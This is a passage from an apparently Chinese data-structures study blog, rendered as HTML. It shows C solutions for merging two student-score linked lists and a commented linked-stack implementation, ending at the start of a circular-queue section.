class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="string">Please</span> <span class="string">input</span> <span class="number">3</span> <span class="string">students'</span> <span class="attr">numbers and scores:</span></span><br><span class="line"><span class="number">101</span> <span class="number">90</span></span><br><span class="line"><span class="number">104</span> <span class="number">80</span></span><br><span class="line"><span class="number">106</span> <span class="number">85</span></span><br><span class="line"><span class="string">Please</span> <span class="string">input</span> <span class="number">5</span> <span class="string">students'</span> <span class="attr">numbers and scores:</span></span><br><span class="line"><span class="number">103</span> <span class="number">95</span></span><br><span class="line"><span class="number">105</span> <span class="number">88</span></span><br><span class="line"><span class="number">107</span> <span class="number">87</span></span><br><span class="line"><span class="number">108</span> <span class="number">90</span></span><br><span class="line"><span class="number">109</span> <span class="number">95</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Output:</span></span><br><span class="line"><span class="attr">The result is:</span></span><br><span class="line"><span class="number">101</span> <span class="number">90</span></span><br><span class="line"><span class="number">103</span> <span class="number">95</span></span><br><span class="line"><span class="number">104</span> <span class="number">80</span></span><br><span class="line"><span class="number">105</span> <span class="number">88</span></span><br><span class="line"><span class="number">106</span> <span class="number">85</span></span><br><span class="line"><span class="number">107</span> <span class="number">87</span></span><br><span class="line"><span class="number">108</span> <span class="number">90</span></span><br><span class="line"><span class="number">109</span> <span class="number">95</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///方法一：直接合并</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">heada</span>, *<span class="title">taila</span>, *<span class="title">headb</span>, *<span class="title">tailb</span>, *<span class="title">head</span>, *<span class="title">tail</span>, *<span class="title">p</span>;</span></span><br><span class="line">    heada = taila = headb = tailb = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input n m:[1-100]\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="comment">/* 读入a链表中的n个学生信息 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input %d students' numbers and scores:\n"</span>, n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        p = (struct node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;p-&gt;num, &amp;p-&gt;score);</span><br><span class="line">        <span class="keyword">if</span> (heada == <span class="literal">NULL</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            heada = taila = p;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            taila-&gt;next = p;</span><br><span class="line">            taila = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    taila-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* 读入b链表中的m个学生信息 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input %d students' numbers and scores:\n"</span>, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; m;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        p = (struct node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;p-&gt;num, &amp;p-&gt;score);</span><br><span class="line">        <span class="keyword">if</span> (headb == <span class="literal">NULL</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            headb = tailb = p;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            tailb-&gt;next = p;</span><br><span class="line">            tailb = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tailb-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Output:\nThe result is:\n"</span>);</span><br><span class="line">    <span class="comment">/* 合并两个链表 */</span></span><br><span class="line">    <span class="comment">/******start******/</span></span><br><span class="line">    head=tail=<span class="literal">NULL</span>; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">p1</span>, *<span class="title">p2</span>;</span></span><br><span class="line">    p1=heada;</span><br><span class="line">    p2=headb;</span><br><span class="line">    <span class="keyword">while</span>(p1!=<span class="literal">NULL</span> &amp;&amp; p2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p1-&gt;num &lt; p2-&gt;num)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                head=tail=p1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next=p1;</span><br><span class="line">                tail=p1;</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                head=tail=p2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next=p2;</span><br><span class="line">                tail=p2;</span><br><span class="line">            &#125;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(p1!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        tail-&gt;next=p1;</span><br><span class="line">        tail=p1;</span><br><span class="line">        p1=p1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(p2!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        tail-&gt;next=p2;</span><br><span class="line">        tail=p2;</span><br><span class="line">        p2=p2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    tail-&gt;next=<span class="literal">NULL</span>; </span><br><span class="line">    <span class="comment">/******end******/</span></span><br><span class="line">    <span class="comment">/* 将合并后的链表进行输出 */</span></span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, p-&gt;num, p-&gt;score);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法二：先合并，再使用冒泡排序</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">heada</span>, *<span class="title">taila</span>, *<span class="title">headb</span>, *<span class="title">tailb</span>, *<span class="title">head</span>, *<span class="title">tail</span>, *<span class="title">p</span>;</span></span><br><span class="line">    heada = taila = headb = tailb = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input n m:[1-100]\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="comment">/* 读入a链表中的n个学生信息 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input %d students' numbers and scores:\n"</span>, n);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        p = (struct node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;p-&gt;num, &amp;p-&gt;score);</span><br><span class="line">        <span class="keyword">if</span> (heada == <span class="literal">NULL</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            heada = taila = p;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            taila-&gt;next = p;</span><br><span class="line">            taila = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    taila-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/* 读入b链表中的m个学生信息 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input %d students' numbers and scores:\n"</span>, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; m;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        p = (struct node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;p-&gt;num, &amp;p-&gt;score);</span><br><span class="line">        <span class="keyword">if</span> (headb == <span class="literal">NULL</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            headb = tailb = p;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            tailb-&gt;next = p;</span><br><span class="line">            tailb = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    tailb-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Output:\nThe result is:\n"</span>);</span><br><span class="line">    <span class="comment">/* 合并两个链表 */</span></span><br><span class="line">    <span class="comment">/******start******/</span></span><br><span class="line">    <span class="comment">//先合并</span></span><br><span class="line">    head=heada;</span><br><span class="line">    taila-&gt;next=headb;</span><br><span class="line">    <span class="comment">//然后使用排序算法</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">p1</span>;</span></span><br><span class="line">    <span class="keyword">int</span> temp1,temp2;</span><br><span class="line">    <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">for</span>(p1=p;p1-&gt;next!=<span class="literal">NULL</span>;p1=p1-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>((p1-&gt;num) &gt; (p1-&gt;next-&gt;num))&#123;</span><br><span class="line">                temp1=p1-&gt;num;</span><br><span class="line">                temp2=p1-&gt;score;</span><br><span class="line">                p1-&gt;num=p1-&gt;next-&gt;num;</span><br><span class="line">                p1-&gt;score=p1-&gt;next-&gt;score;</span><br><span class="line">                p1-&gt;next-&gt;num=temp1;</span><br><span class="line">                p1-&gt;next-&gt;score=temp2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">/******end******/</span></span><br><span class="line">    <span class="comment">/* 将合并后的链表进行输出 */</span></span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, p-&gt;num, p-&gt;score);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="43-链栈"><a href="#43-链栈" class="headerlink" title="43 链栈"></a>43 链栈</h2><p><strong>翔哥代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  文件名：LinkStack.c</span></span><br><span class="line"><span class="comment"> *  链栈的实现</span></span><br><span class="line"><span class="comment"> *  版本：1.0</span></span><br><span class="line"><span class="comment"> *  时间：2016.09.26</span></span><br><span class="line"><span class="comment"> *  作者：wangx</span></span><br><span class="line"><span class="comment"> *  假定条件： 假设元素的基本类型为int，且每个元素只有一个整数信息需要压栈</span></span><br><span class="line"><span class="comment"> *          </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"malloc.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARAM_ERROR -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ERROR -2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="keyword">int</span> TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">SNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    StackNode *Top; <span class="comment">//一重指针，指向栈顶结点</span></span><br><span class="line">&#125;LinkStack, *PLinkStack; <span class="comment">//PLinkStack是二重指针，等效于LinkStack *</span></span><br><span class="line"><span class="comment">//此处定义了一个链栈类型，叫LinkStack，该结构只有一个数据成员，即一个指向栈顶结点的指针Top</span></span><br><span class="line"><span class="comment">//因为链栈中不设置表头结点，也不需要栈底指针，所以只有一个Top指针变量来指向栈顶元素即可。同学们可以自行添加栈的其他辅助信息到这个结构里面，例如栈的当前深度之类的</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//初始化链栈，只需要将Top指针置空即可</span></span><br><span class="line"> <span class="comment">//子函数内改变Top指针的值，故形参为二级指针</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitStack</span><span class="params">(LinkStack **ppStack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (*ppStack== <span class="literal">NULL</span>) <span class="comment">//参数校验，该二级指针必须要指向主调函数中的一个LinkStack *类型的指针变量，即该二级指针指向的东西必须存在！</span></span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line"></span><br><span class="line">    *ppStack= (LinkStack*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkStack));</span><br><span class="line">    (*ppStack)-&gt;Top= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ClearStack</span><span class="params">(LinkStack *pStack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StackNode *pTemp, *pNext;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pStack== <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR; <span class="comment">//栈如果不存在，返回错误码。注意，空栈的状态是允许的，即允许pStack-&gt;Top==NULL</span></span><br><span class="line"></span><br><span class="line">    pTemp= pStack-&gt;Top;</span><br><span class="line">    <span class="keyword">while</span>(pTemp!= <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pNext= pTemp-&gt;next; </span><br><span class="line">        <span class="built_in">free</span>(pTemp);</span><br><span class="line">        pTemp= pNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为链栈无表头，所以清空和销毁操作是同样的操作</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DestroyStack</span><span class="params">(LinkStack **ppStack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (*ppStack== <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR; <span class="comment">//栈如果不存在，返回错误码。注意，空栈的状态是允许的，即允许pStack-&gt;Top==NULL</span></span><br><span class="line"></span><br><span class="line">    ClearStack(*ppStack);</span><br><span class="line">    <span class="built_in">free</span>(*ppStack);</span><br><span class="line">    *ppStack= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Push</span><span class="params">(LinkStack *pStack, TElemType Value)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   StackNode *p;</span><br><span class="line">   <span class="keyword">if</span> (pStack== <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR; <span class="comment">//栈如果不存在，返回错误码。注意，空栈的状态是允许的，即允许pStack-&gt;Top==NULL</span></span><br><span class="line">   p=(StackNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">   <span class="keyword">if</span>(!p)</span><br><span class="line">     <span class="keyword">return</span> MALLOC_ERROR;</span><br><span class="line">   p-&gt;data=Value;</span><br><span class="line">   <span class="comment">//头插法入栈  必须用头插法入栈</span></span><br><span class="line">   p-&gt;next=pStack-&gt;Top;  </span><br><span class="line">   pStack-&gt;Top=p;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pop</span><span class="params">(LinkStack *pStack, TElemType *pValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StackNode *p;</span><br><span class="line">    <span class="keyword">if</span> (pStack== <span class="literal">NULL</span> || pStack-&gt;Top == <span class="literal">NULL</span> || pValue==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR; <span class="comment">//空栈无数据可返回，返回错误码</span></span><br><span class="line">    p= pStack-&gt;Top;  <span class="comment">//临时指针指向栈顶结点</span></span><br><span class="line">    pStack-&gt;Top= pStack-&gt;Top-&gt;next;  <span class="comment">//调整栈顶指针，指向下一个结点（出栈后的新栈顶结点）</span></span><br><span class="line"></span><br><span class="line">    *pValue= p-&gt;data;  <span class="comment">//将原栈顶结点的数据值取出，返回给主调函数使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);  <span class="comment">//销毁原栈顶结点</span></span><br><span class="line">    p=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断一个栈是否为空栈</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsStackEmpty</span><span class="params">(LinkStack *pStack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pStack==<span class="literal">NULL</span>) <span class="comment">//参数校验</span></span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pStack-&gt;Top == <span class="literal">NULL</span>) <span class="comment">//如果是空栈</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//空栈返回1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TElemType value;</span><br><span class="line">    LinkStack *pStack;</span><br><span class="line">    InitStack(&amp;pStack);</span><br><span class="line">    Push(pStack, <span class="number">10</span>);</span><br><span class="line">    Push(pStack, <span class="number">20</span>);</span><br><span class="line">    Push(pStack, <span class="number">30</span>);</span><br><span class="line">    Push(pStack, <span class="number">40</span>);</span><br><span class="line"><span class="comment">//  DestroyStack(&amp;pStack);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!IsStackEmpty(pStack))</span><br><span class="line">    &#123;</span><br><span class="line">        Pop(pStack, &amp;value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyStack(&amp;pStack);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="44-循环队列"><a href="#44-循环队列" class="headerlink" title="44 循环队列"></a>44 